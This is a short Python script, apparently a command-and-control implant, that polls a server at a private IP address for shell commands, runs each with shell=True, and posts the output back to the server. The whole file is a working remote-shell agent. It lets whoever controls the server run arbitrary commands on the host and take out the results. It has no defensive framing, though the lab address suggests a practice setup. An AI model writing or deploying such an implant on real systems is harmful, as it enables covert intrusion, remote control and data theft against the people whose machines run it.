# agent.py
import time
import requests
import subprocess

agent_id = "agent01"
server_url = "http://192.168.32.130:5000"



def run_command(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        return e.output

def poll_and_execute():
    while True:
        try:
            res = requests.get(f"{server_url}/get/{agent_id}")
            cmd = res.json().get("command")
            print(cmd)
            if cmd:
                print(f"[Agent:{agent_id}] Executing: {cmd}")
                output = run_command(cmd)
                print(f"[Output]\n{output}")

                # Send back the output
                report = {"command": cmd, "output": output}
                requests.post(f"{server_url}/report/{agent_id}", json=report)
            else:
                print("[Agent] No command, waiting...")
            time.sleep(2)
        except Exception as e:
            print(f"[Agent Error] {e}")
            time.sleep(5)

if __name__ == "__main__":
    poll_and_execute()
